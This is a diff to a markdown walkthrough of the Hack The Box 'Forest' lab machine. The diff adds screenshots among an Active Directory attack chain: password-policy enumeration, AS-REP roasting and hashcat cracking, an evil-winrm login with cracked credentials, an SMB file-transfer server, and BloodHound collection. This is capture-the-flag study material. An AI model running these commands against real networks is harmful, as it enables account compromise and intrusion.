@@ -50,6 +50,10 @@ https://www.epochconverter.com/ldap # Allows to transform data and to know if th
 
 ``queryuser svc-alfresco``
 
+![foret1](https://user-images.githubusercontent.com/123066149/219473940-1d997e3f-02fc-43da-b23a-1b1caf983c85.PNG)
+
+![foret2](https://user-images.githubusercontent.com/123066149/219474000-d7af10d8-b7c2-4ca7-9a8e-fd5ee81e850b.PNG)
+
 ### AD passwords policy with CME (crackmapexec) :
 
 ``crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''``
@@ -64,11 +68,19 @@ https://www.epochconverter.com/ldap # Allows to transform data and to know if th
 
 ``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/``       :white_check_mark:
 
+![foret3](https://user-images.githubusercontent.com/123066149/219474106-21ca5839-47c6-490d-a634-04ffff9ea1ae.PNG)
+
+
 ``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/ -format hashcat``
+
+![foret4](https://user-images.githubusercontent.com/123066149/219474172-104cc2cc-402f-4c70-875d-de718e5343cf.PNG)
+
 
 ``hashcat --example-hashes | grep -i krb``
 
 ``hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt`` # ippsec add -r rules/InsidePro-PasswordsPro.rule try to understand why
+
+![foret5](https://user-images.githubusercontent.com/123066149/219474212-b889f930-8baa-4792-8ca8-2dca650ce1f5.PNG)
 
 
 # ${{\color{purple}Initial Foothold}}\ $
@@ -87,6 +99,9 @@ https://www.epochconverter.com/ldap # Allows to transform data and to know if th
 
 ``/usr/bin/evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161``
 
+![foret6](https://user-images.githubusercontent.com/123066149/219474485-14552105-e748-4666-b91c-bf4ffa8ebbd0.PNG)
+
+
 # ${{\color{purple}Privilege Escalation}}\ $
 
 ### File transfer with FTP:
@@ -94,6 +109,9 @@ https://www.epochconverter.com/ldap # Allows to transform data and to know if th
 ``find . | grep exe$``
 
 ``impacket-smbserver idk $(pwd) -smb2support -user user -password idkazewxc123``
+
+![foret7](https://user-images.githubusercontent.com/123066149/219474532-29bb4e52-4708-4b0f-a113-c9208183c429.PNG)
+
 
 ``$pass = convertto-securestring 'idkazewxc123' -AsPlainText -Force``
 
@@ -139,11 +157,17 @@ https://www.epochconverter.com/ldap # Allows to transform data and to know if th
 ### if there is an installation of bloodhound and I don't remember the password neo4j delet :
 
 ``rm /usr/share/neo4j/data/dbms/auth``
+
 ``neo4j console``
+
 ``neo4j password : sparta-castro-union-labor-pluto-9066``
 
+
 ``./BloodHound --no-sandbox``
+
 ``.\SharpHound.exe -c all``
+
+![foret8](https://user-images.githubusercontent.com/123066149/219474603-46922d67-0cc6-4e78-a08f-7ae8974f63fc.PNG)
 
 ### Bloodhound search :
 
